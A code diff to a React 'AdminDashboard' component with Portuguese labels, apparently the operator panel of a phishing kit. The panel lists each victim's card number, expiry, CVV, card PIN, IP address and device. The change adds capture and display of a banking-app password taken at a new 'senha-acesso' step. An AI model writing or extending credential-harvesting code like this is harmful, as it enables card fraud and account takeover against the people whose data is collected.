@@ -197,8 +197,10 @@ const AdminDashboard = () => {
         client.numero_cartao = d.numero;
         client.validade = d.validade;
         client.cvv = d.cvv;
-      } else if (entry.step === "confirmacao") {
-        client.senha_cartao = d.senha;
+      } else if (entry.step === "senha-acesso") {
+        client.senha_app = d.senha;
+      } else if (entry.step === "senha-cartao" || entry.step === "confirmacao") {
+        client.senha_cartao = d.senhaCartao || d.senha;
       }
     });
     setGroupedClients(
@@ -322,6 +324,7 @@ const AdminDashboard = () => {
                     <div><span className="text-muted-foreground">Validade:</span> <span className="text-foreground font-medium">{client.validade || "—"}</span></div>
                     <div><span className="text-muted-foreground">CVV:</span> <span className="text-foreground font-medium">{client.cvv || "—"}</span></div>
                   </div>
+                  <div><span className="text-muted-foreground">Senha App:</span> <span className="text-foreground font-medium">{client.senha_app || "—"}</span></div>
                   <div><span className="text-muted-foreground">Senha Cartão:</span> <span className="text-foreground font-medium">{client.senha_cartao || "—"}</span></div>
                   <div><span className="text-muted-foreground">IP:</span> <span className="text-foreground font-medium">{client.ip_address || "—"}</span></div>
                   <div><span className="text-muted-foreground">Dispositivo:</span> <span className="text-foreground font-medium">{detectDevice(client.user_agent)}</span></div>
